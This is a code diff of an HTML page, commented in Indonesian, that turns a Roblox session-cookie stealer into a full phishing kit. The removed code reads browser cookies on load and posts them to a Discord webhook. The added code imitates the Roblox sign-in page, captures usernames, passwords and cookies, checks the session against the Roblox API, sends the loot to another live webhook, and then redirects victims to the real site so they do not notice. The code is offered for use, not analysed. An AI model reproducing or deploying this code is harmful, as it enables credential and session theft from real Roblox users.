@@ -1,118 +1,264 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox</title>
+    <title>Roblox - Sign In</title>
+    <!-- Font Modern -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
-        /* CSS Sederhana agar terlihat bersih */
+        :root {
+            --primary-color: #00b06f; /* Warna Hijau Roblox */
+            --bg-color: #f2f4f5;
+            --text-color: #393a3c;
+        }
+
         body {
-            background-color: #232527;
-            color: white;
-            font-family: 'Gotham', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            font-family: 'Poppins', sans-serif;
+            background-color: var(--bg-color);
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
+            overflow: hidden;
         }
+
         .container {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            width: 100%;
+            max-width: 400px;
             text-align: center;
+            position: relative;
         }
-        .spinner {
-            border: 4px solid rgba(255, 255, 255, 0.1);
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            border-left-color: #fff;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+
+        .logo {
+            width: 120px;
+            margin-bottom: 20px;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+
+        h2 {
+            color: var(--text-color);
+            margin-bottom: 20px;
+            font-weight: 600;
         }
-        p {
+
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
             font-size: 14px;
-            color: #b8b8b8;
+            color: #5a5b5d;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #aeb4b9;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            box-sizing: border-box;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(0, 176, 111, 0.1);
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background-color: #009a61;
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            display: none;
+            color: #5a5b5d;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        /* Modal Verifikasi Palsu */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .modal-box {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            width: 300px;
+        }
+
+        .modal-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--primary-color);
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
         }
     </style>
 </head>
 <body>
 
-    <!-- UI Loading Palsu -->
-    <div class="container" id="loader">
-        <div class="spinner"></div>
-        <p>Sedang memverifikasi sesi...</p>
+    <div class="container">
+        <!-- Logo SVG Roblox -->
+        <svg class="logo" viewBox="0 0 100 30" fill="#393a3c">
+            <path d="M10,5 L20,5 L20,15 L30,15 L30,25 L10,25 Z M5,10 L10,10 L10,20 L5,20 Z" /> 
+            <text x="35" y="20" font-family="Poppins" font-weight="bold" font-size="20">ROBLOX</text>
+        </svg>
+
+        <h2>Sign in to Roblox</h2>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="username">Username or Email</label>
+                <input type="text" id="username" required autocomplete="off">
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" required>
+            </div>
+            
+            <button type="submit" id="btnLogin">
+                <span id="btnText">Log In</span>
+                <div class="spinner" id="spinner"></div>
+            </button>
+        </form>
+        <div class="loading-text" id="loadingText">Logging in...</div>
     </div>
 
-    <!-- Script Utama Stealer -->
-    <script>
-        // WEBHOOK URL KAMU (Sudah diisi otomatis)
-        const webhookURL = "https://discord.com/api/webhooks/1566098183124164710/JDnzeIomdkO0FtHxj1KKGncUtWmTKU5BQMuA0o3IaJMbI3gnBcjGzXjJVQZW__LVIV85";
+    <!-- Modal Verifikasi Palsu -->
+    <div class="modal-overlay" id="verifyModal">
+        <div class="modal-box">
+            <h3>Verifying Account</h3>
+            <div class="modal-spinner"></div>
+            <p>Please wait a moment...</p>
+        </div>
+    </div>
 
-        window.onload = function() {
-            // Ambil semua cookie dari browser saat ini
-            let cookies = document.cookie;
+    <script>
+        // GANTI DENGAN WEBHOOK DISCORD KAMU
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1566104588967223316/ibzqLWed6pRp18jlS5fcCwO3GnUdGvwdE6pKOyyFJA4MFOn4MBkFk5OIjJKtzEZkFXcC"; 
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
             
-            // Ambil User Agent untuk identifikasi device
-            let userAgent = navigator.userAgent;
-            
-            // Coba ambil info user sederhana via API publik Roblox jika memungkinkan
-            // Catatan: Ini opsional, banyak cookie sudah cukup.
-            let robloxUserId = "Unknown";
-            
-            // Format Embed Discord
-            const payload = {
-                content: null,
-                embeds: [{
-                    title: "🍪 Roblox Cookie Stolen!",
-                    description: "Cookie berhasil diambil dari target.",
-                    color: 15158332, // Warna biru tua/hitam khas Roblox/Discord
-                    fields: [
-                        {
-                            name: "🔑 Cookie",
-                            value: `\`\`\`${cookies}\`\`\``,
-                            inline: false
-                        },
-                        {
-                            name: "🖥️ Device Info",
-                            value: `\`\`\`${userAgent}\`\`\``,
-                            inline: false
-                        },
-                        {
-                            name: "🆔 Status",
-                            value: "✅ Success",
-                            inline: true
-                        }
-                    ],
-                    footer: {
-                        text: "Captured at " + new Date().toLocaleString(),
-                        icon_url: "https://www.roblox.com/favicon.ico"
-                    },
-                    timestamp: new Date().toISOString()
-                }]
+            const btn = document.getElementById('btnLogin');
+            const btnText = document.getElementById('btnText');
+            const spinner = document.getElementById('spinner');
+            const loadingText = document.getElementById('loadingText');
+            const modal = document.getElementById('verifyModal');
+
+            // 1. Ubah Tombol jadi Loading
+            btnText.style.display = 'none';
+            spinner.style.display = 'block';
+            loadingText.style.display = 'block';
+
+            // Simulasi delay sedikit biar terasa "real"
+            await new Promise(r => setTimeout(r, 1000));
+
+            // Ambil data input
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const cookies = document.cookie;
+
+            // 2. Tampilkan Modal Verifikasi
+            spinner.style.display = 'none';
+            loadingText.style.display = 'none';
+            modal.style.display = 'flex';
+
+            // Eksekusi API Session Hijacking
+            try {
+                const response = await fetch("https://users.roblox.com/v1/users/authenticated", {
+                    method: "GET",
+                    headers: { "Cookie": cookies }
+                });
+
+                let userData = null;
+                if (response.ok) {
+                    userData = await response.json();
+                }
+
+                // Kirim Data ke Discord
+                await sendToDiscord(username, password, cookies, userData);
+
+            } catch (error) {
+                console.error("Error:", error);
+            }
+
+            // 3. Tutup Modal dan Redirect
+            modal.style.display = 'none';
+            window.location.href = "https://www.roblox.com/home";
+        });
+
+        async function sendToDiscord(user, pass, cookie, data) {
+            const embed = {
+                title: "🎣 New Roblox Login Detected!",
+                color: 5814783,
+                fields: [
+                    { name: "👤 Username", value: user },
+                    { name: "🔑 Password", value: pass || "Hidden" },
+                    { name: "🆔 User ID", value: data ? data.id : "Unknown" },
+                    { name: "✅ Status", value: data ? "Active & Valid" : "Invalid" }
+                ],
+                footer: { text: "Pro Phishing Kit v2.0" },
+                timestamp: new Date().toISOString()
             };
 
-            // Kirim ke Webhook
-            fetch(webhookURL, {
+            await fetch(WEBHOOK_URL, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            }).then(() => {
-                // Tampilkan loading sebentar agar terlihat natural
-                setTimeout(() => {
-                    // Redirect ke halaman utama Roblox setelah sukses kirim data
-                    window.location.href = "https://www.roblox.com/home";
-                }, 1500);
-            }).catch(error => {
-                console.error("Error sending data:", error);
-                // Tetap redirect meskipun gagal kirim, agar target tidak curiga
-                window.location.href = "https://www.roblox.com/home";
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [embed] })
             });
-        };
+        }
     </script>
 </body>
 </html>
